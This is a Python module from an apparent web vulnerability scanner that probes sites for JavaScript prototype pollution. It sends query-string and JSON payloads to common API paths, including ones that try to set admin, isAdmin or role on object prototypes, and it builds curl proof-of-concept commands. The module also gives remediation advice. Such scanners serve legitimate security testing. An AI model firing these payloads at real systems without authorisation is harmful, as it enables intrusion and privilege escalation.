#  MODULE v38-4 — Prototype Pollution Scanner
# ════════════════════════════════════════════════════════════════════════

class PrototypePollutionScanner:
    """Detect JavaScript prototype pollution vulnerabilities."""

    PP_PAYLOADS = [
        "__proto__[polluted]=webscout38",
        "__proto__.polluted=webscout38",
        "constructor[prototype][polluted]=webscout38",
        "constructor.prototype.polluted=webscout38",
        "__proto__[admin]=true",
        "__proto__[isAdmin]=true",
        "__proto__[role]=admin",
        "__proto__[debug]=true",
        '{"__proto__":{"polluted":"webscout38"}}',
        '{"constructor":{"prototype":{"polluted":"webscout38"}}}',
    ]

    SERVER_PP_PATHS = [
        "/api/user/update",
        "/api/settings",
        "/api/profile",
        "/api/config",
        "/user/update",
        "/settings/update",
        "/profile",
    ]

    async def scan(self, client: WebScoutClient, base_url: str) -> list:
        findings = []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # GET-based prototype pollution (query string)
        for payload in self.PP_PAYLOADS[:6]:
            if "=" in payload and "[" in payload:
                # query string style
                test_url = base_url + ("&" if "?" in base_url else "?") + payload
                r = await client.get(test_url)
                if r and "webscout38" in r["text"]:
                    findings.append(Finding(
                        plugin="proto_pollution",
                        title="Prototype Pollution via Query String",
                        severity="HIGH", confidence=85.0,
                        description="Server reflects prototype pollution payload — client/server-side PP possible.",
                        evidence=f"Payload: {payload} | Response snippet: {r['text'][:200]}",
                        url=test_url, payload=payload,
                        remediation="Sanitize object keys. Block __proto__, constructor, prototype. Use Object.create(null).",
                        cwe="CWE-1321", cvss=7.5, owasp="A03",
                        poc=f"curl -sk '{test_url}'",
                        tags=["prototype-pollution", "javascript"],
                    ))
                    log("VULN", f"Prototype pollution via query string: {payload[:50]}")

        # POST-based prototype pollution (JSON body)
        for path in self.SERVER_PP_PATHS:
            url = base + path
            for json_payload in [
                {"__proto__": {"polluted": "webscout38"}},
                {"constructor": {"prototype": {"polluted": "webscout38"}}},
                {"__proto__": {"admin": True, "isAdmin": True}},
            ]:
                r = await client.post(url, json_body=json_payload)
                if not r:
                    continue
                body_lower = r["text"].lower()
                if "webscout38" in r["text"] or (
                    r["status"] == 200 and "admin" in body_lower and json_payload.get("__proto__", {}).get("admin")
                ):
                    findings.append(Finding(
                        plugin="proto_pollution",
                        title=f"Server-Side Prototype Pollution — {path}",
                        severity="CRITICAL", confidence=88.0,
                        description="JSON body with __proto__ key accepted and may pollute server-side object.",
                        evidence=f"Endpoint: {url} | Payload: {json.dumps(json_payload)[:120]}",
                        url=url, payload=str(json_payload),
                        remediation="Use JSON schema validation. Strip __proto__/constructor keys before merging.",
                        cwe="CWE-1321", cvss=9.8, owasp="A03",
                        poc=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{json.dumps(json_payload)}'",
                        tags=["prototype-pollution", "sspp"],
                    ))
                    log("VULN", f"Server-side PP at {path}")
                    break

        # Check for client-side PP indicators in JavaScript
        page = await client.get(base_url)
        if page:
            js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', page["text"], re.I)
            for js_url in js_urls[:5]:
                jr = await client.get(urljoin(base_url, js_url))
                if not jr:
                    continue
                dangerous_patterns = [
                    r"Object\.assign\s*\(",
                    r"merge\s*\([^)]*,\s*[^)]*\)",
                    r"\[key\]\s*=\s*value",
                    r"for\s*\(\s*(?:var|let|const)\s+\w+\s+in\s+\w+\)",
                    r"deepmerge|deepMerge|_.merge\(",
                ]
                for pat in dangerous_patterns:
                    if re.search(pat, jr["text"]):
                        findings.append(Finding(
                            plugin="proto_pollution",
                            title=f"Potential Client-Side PP Pattern: {js_url.split('/')[-1][:40]}",
                            severity="LOW", confidence=50.0,
                            description=f"JS file uses unsafe merge pattern ('{pat}') susceptible to prototype pollution.",
                            evidence=f"Pattern: {pat} | File: {js_url}",
                            url=urljoin(base_url, js_url),
                            remediation="Use lodash >=4.17.21, or safe merge implementations that filter __proto__.",
                            cwe="CWE-1321", owasp="A03",
                            tags=["prototype-pollution", "client-side", "javascript"],
                        ))
                        break

        log("OK", f"Prototype pollution scan done — {len(findings)} finding(s)")
        return findings


